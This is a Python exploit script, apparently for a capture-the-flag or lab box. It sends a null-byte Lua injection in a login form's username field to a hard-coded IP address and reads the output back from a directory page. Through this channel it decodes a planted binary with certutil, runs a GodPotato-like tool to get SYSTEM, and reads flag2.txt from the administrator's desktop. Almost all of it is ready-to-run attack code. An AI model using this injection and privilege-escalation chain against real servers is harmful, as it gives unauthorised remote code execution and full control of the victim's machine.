import requests, urllib.parse, re, time, sys, os
TARGET="http://23.179.17.68"
OUTDIR="/tmp/w2_out"
os.makedirs(OUTDIR, exist_ok=True)
LOG="/tmp/w2_watch.log"

# Staged commands — each runs exactly once on a successful up-cycle, sequentially
# Uses existing gp.b64 (previous solver planted it) via certutil -decode
STAGES = [
    ("stage1_check_gp",  # verify gp.b64 exists and its size
     'local h=io.popen("dir c:\\\\users\\\\public\\\\gp.b64 2>nul"); print(h:read("*a"))'),
    ("stage2_decode_gp",  # decode gp.b64 to %TEMP%\gp.exe using certutil
     'local h=io.popen("certutil -decode c:\\\\users\\\\public\\\\gp.b64 c:\\\\users\\\\bob\\\\appdata\\\\local\\\\temp\\\\gp.exe 2>&1"); print(h:read("*a"))'),
    ("stage3_run_gp_whoami",  # run gp.exe to get SYSTEM whoami — GodPotato-like CLI: -cmd
     'local h=io.popen("c:\\\\users\\\\bob\\\\appdata\\\\local\\\\temp\\\\gp.exe -cmd \\"cmd /c whoami\\" 2>&1"); print(h:read("*a"))'),
    ("stage3b_run_gp_help",  # try -h to confirm CLI
     'local h=io.popen("c:\\\\users\\\\bob\\\\appdata\\\\local\\\\temp\\\\gp.exe -h 2>&1"); print(h:read("*a"))'),
    ("stage4_admin_ls",  # once we know CLI, list admin desktop as SYSTEM
     'local h=io.popen("c:\\\\users\\\\bob\\\\appdata\\\\local\\\\temp\\\\gp.exe -cmd \\"cmd /c dir /a c:\\\\users\\\\administrator\\\\desktop\\" 2>&1"); print(h:read("*a"))'),
    ("stage5_read_flag2",  # type flag2.txt as SYSTEM
     'local h=io.popen("c:\\\\users\\\\bob\\\\appdata\\\\local\\\\temp\\\\gp.exe -cmd \\"cmd /c type c:\\\\users\\\\administrator\\\\desktop\\\\flag2.txt\\" 2>&1"); print(h:read("*a"))'),
    ("stage5b_find_flag2",  # search broadly as SYSTEM
     'local h=io.popen("c:\\\\users\\\\bob\\\\appdata\\\\local\\\\temp\\\\gp.exe -cmd \\"cmd /c dir /a /s /b c:\\\\ ^| findstr /i flag2\\" 2>&1"); print(h:read("*a"))'),
]

def up():
    try: return requests.get(f"{TARGET}/login.html", timeout=4).status_code == 200
    except: return False

def lua(code):
    enc = urllib.parse.quote(code, safe="")
    pl = f"%00]]%0d{enc}%0d--"
    try:
        r = requests.post(f"{TARGET}/loginok.html", headers={
            "Cookie":"client_lang=english",
            "Content-Type":"application/x-www-form-urlencoded",
            "Referer":f"{TARGET}/login.html?lang=english",
            "Origin":TARGET},
            data=f"username=anonymous{pl}&password=", timeout=20)
    except Exception as e:
        return None, f"post-err:{e}"
    m = re.search(r"UID=([^;]+)", r.headers.get("Set-Cookie",""))
    if not m: return None, "no-UID"
    try:
        r2 = requests.get(f"{TARGET}/dir.html", headers={"Cookie":f"UID={m.group(1)}"}, timeout=20)
    except Exception as e:
        return None, f"get-err:{e}"
    body = r2.text
    if "session expired" in body: return None, "session-expired"
    pre = body.split("<?xml")[0] if "<?xml" in body else body
    return pre, None

def log(m):
    with open(LOG,"a") as f: f.write(f"{time.strftime('%H:%M:%S')} {m}\n")

stage = 0
while stage < len(STAGES):
    if up():
        name, code = STAGES[stage]
        body, err = lua(code)
        if body is not None:
            with open(f"{OUTDIR}/{stage:02d}_{name}.txt","w") as f:
                f.write(body)
            log(f"OK {name} len={len(body)}")
            stage += 1
        else:
            log(f"up but {err}")
    else:
        log("down")
    time.sleep(30)
log("all stages done")
